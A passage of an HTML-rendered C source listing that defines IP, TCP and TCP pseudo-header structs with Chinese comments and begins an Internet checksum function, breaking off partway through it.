</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 64
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 65
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 66
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 67
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 68
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 69
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 70
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 71
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 72
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 73
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 74
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 75
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 76
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 77
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 78
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 79
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 80
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 81
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 82
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 83
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 84
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 85
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 86
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 87
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 88
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 89
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 90
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 91
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 92
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 93
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 94
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 95
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 96
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 97
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 98
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 99
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">100
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">101
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">102
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">103
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">104
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">105
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">106
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">107
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">108
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">109
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">110
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">111
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">112
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">113
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">114
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">115
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">116
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">117
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">118
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">119
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">120
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">121
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">122
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">123
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">124
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">125
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">126
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">127
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">128
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">129
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">130
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">131
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">132
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">133
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">134
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">135
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">136
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">137
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">138
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">139
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">140
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">141
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">142
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">143
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">144
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">145
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">146
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">147
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">148
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">149
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">150
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">151
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">152
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">153
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">154
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">155
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">156
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">157
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">158
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">159
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">160
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">161
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">162
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">163
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">164
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">165
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">166
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">167
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">168
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">169
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">170
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">171
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">172
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">173
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">174
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">175
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">176
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">177
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">178
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">179
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">180
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">181
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">182
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">183
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">184
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">185
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">186
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">187
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">188
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">189
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">190
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">191
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">192
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">193
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">194
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">195
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">196
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">197
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">198
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">199
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">200
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">201
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">202
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">203
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">204
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">205
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">206
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">207
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">208
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">209
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">210
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">211
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">212
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">213
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">214
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">215
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">216
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">217
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">218
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">219
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">220
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">221
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">222
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">223
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">224
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">225
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">226
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">227
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">228
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">229
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">230
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">231
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">232
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">233
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">234
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">235
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">236
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">237
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">238
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#0f0;font-weight:bold">#include</span> <span style="color:#0f0;font-weight:bold">&lt;stdio.h&gt;</span><span style="color:#0f0;font-weight:bold">
</span></span></span><span style="display:flex;"><span><span style="color:#0f0;font-weight:bold">#include</span> <span style="color:#0f0;font-weight:bold">&lt;ctype.h&gt;</span><span style="color:#0f0;font-weight:bold">
</span></span></span><span style="display:flex;"><span><span style="color:#0f0;font-weight:bold">#include</span> <span style="color:#0f0;font-weight:bold">&lt;unistd.h&gt;</span><span style="color:#0f0;font-weight:bold">
</span></span></span><span style="display:flex;"><span><span style="color:#0f0;font-weight:bold">#include</span> <span style="color:#0f0;font-weight:bold">&lt;fcntl.h&gt;</span><span style="color:#0f0;font-weight:bold">
</span></span></span><span style="display:flex;"><span><span style="color:#0f0;font-weight:bold">#include</span> <span style="color:#0f0;font-weight:bold">&lt;signal.h&gt;</span><span style="color:#0f0;font-weight:bold">
</span></span></span><span style="display:flex;"><span><span style="color:#0f0;font-weight:bold">#include</span> <span style="color:#0f0;font-weight:bold">&lt;sys/time.h&gt;</span><span style="color:#0f0;font-weight:bold">
</span></span></span><span style="display:flex;"><span><span style="color:#0f0;font-weight:bold">#include</span> <span style="color:#0f0;font-weight:bold">&lt;sys/types.h&gt;</span><span style="color:#0f0;font-weight:bold">
</span></span></span><span style="display:flex;"><span><span style="color:#0f0;font-weight:bold">#include</span> <span style="color:#0f0;font-weight:bold">&lt;sys/socket.h&gt;</span><span style="color:#0f0;font-weight:bold">
</span></span></span><span style="display:flex;"><span><span style="color:#0f0;font-weight:bold">#include</span> <span style="color:#0f0;font-weight:bold">&lt;string.h&gt;</span><span style="color:#0f0;font-weight:bold">
</span></span></span><span style="display:flex;"><span><span style="color:#0f0;font-weight:bold">#include</span> <span style="color:#0f0;font-weight:bold">&lt;netdb.h&gt;</span><span style="color:#0f0;font-weight:bold">
</span></span></span><span style="display:flex;"><span><span style="color:#0f0;font-weight:bold">#include</span> <span style="color:#0f0;font-weight:bold">&lt;errno.h&gt;</span><span style="color:#0f0;font-weight:bold">
</span></span></span><span style="display:flex;"><span><span style="color:#0f0;font-weight:bold">#include</span> <span style="color:#0f0;font-weight:bold">&lt;stdlib.h&gt;</span><span style="color:#0f0;font-weight:bold">
</span></span></span><span style="display:flex;"><span><span style="color:#0f0;font-weight:bold">#include</span> <span style="color:#0f0;font-weight:bold">&lt;time.h&gt;</span><span style="color:#0f0;font-weight:bold">
</span></span></span><span style="display:flex;"><span><span style="color:#0f0;font-weight:bold">#include</span> <span style="color:#0f0;font-weight:bold">&lt;arpa/inet.h&gt;</span><span style="color:#0f0;font-weight:bold">
</span></span></span><span style="display:flex;"><span><span style="color:#0f0;font-weight:bold"></span>
</span></span><span style="display:flex;"><span><span style="color:#007f7f">// ip 报头
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span><span style="color:#fff;font-weight:bold">struct</span> iphdr
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">char</span>       ver_and_hdrlen;<span style="color:#007f7f">// 版本号与IP头部长度
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">char</span>       tos;           <span style="color:#007f7f">// 服务类型
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">short</span>      total_len;     <span style="color:#007f7f">// 总长度
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">short</span>      id;            <span style="color:#007f7f">// IP包ID
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">short</span>      flags;         <span style="color:#007f7f">// 标志位(包括分片偏移量)
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">char</span>       ttl;           <span style="color:#007f7f">// 生命周期
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">char</span>       protocol;      <span style="color:#007f7f">// 上层协议
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">short</span>      checksum;      <span style="color:#007f7f">// 校验和
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">int</span>        srcaddr;       <span style="color:#007f7f">// 源IP地址
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">int</span>        dstaddr;       <span style="color:#007f7f">// 目标IP地址
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#007f7f">// tcp 报头
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span><span style="color:#fff;font-weight:bold">struct</span> tcphdr
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">short</span>      sport;    <span style="color:#007f7f">// 源端口
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">short</span>      dport;    <span style="color:#007f7f">// 目标端口
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">int</span>        seq;      <span style="color:#007f7f">// 序列号
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">int</span>        ack_seq;  <span style="color:#007f7f">// 确认号
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">char</span>       len;      <span style="color:#007f7f">// 首部长度
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">char</span>       flag;     <span style="color:#007f7f">// 标志位
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">short</span>      win;      <span style="color:#007f7f">// 窗口大小
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">short</span>      checksum; <span style="color:#007f7f">// 校验和
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">short</span>      urg;      <span style="color:#007f7f">// 紧急指针
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#007f7f">//TCP的伪报头，在计算TCP的校验和时需要包含
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span><span style="color:#fff;font-weight:bold">struct</span> pseudohdr
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">int</span>        saddr; <span style="color:#007f7f">//源目的IP
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">int</span>        daddr; <span style="color:#007f7f">// 目的IP
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">char</span>                zeros; <span style="color:#007f7f">// 8位保留字符 一般置0
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">char</span>                protocol;<span style="color:#007f7f">// 协议
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">short</span>      length; <span style="color:#007f7f">// 长度
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#007f7f">// 这个是计算校验和的函数
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span><span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">short</span> <span style="color:#fff;font-weight:bold">inline</span>
</span></span><span style="display:flex;"><span>checksum(<span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">short</span> *buffer, <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">short</span> size)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">long</span> cksum = <span style="color:#ff0;font-weight:bold">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">while</span> (size &gt; <span style="color:#ff0;font-weight:bold">1</span>) {
</span></span><span style="display:flex;"><span>        cksum += *buffer++;
</span></span><span style="display:flex;"><span>        size  -= <span style="color:#fff;font-weight:bold">sizeof</span>(<span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">short</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">if</span> (size) {
</span></span><span style="display:flex;"><span>        cksum += *(<span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">char</span> *)buffer;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    cksum = (cksum &gt;&gt; <span style="color:#ff0;font-weight:bold">16</span>) + (cksum &amp; <span style="color:#ff0;font-weight:bold">0xffff</span>);
</span></span><span style="display:flex;"><span>    cksum += (cksum &gt;&gt; <span style="color:#ff0;font-weight:bold">16</span>);
</span></span><span style="display:flex;"><span>
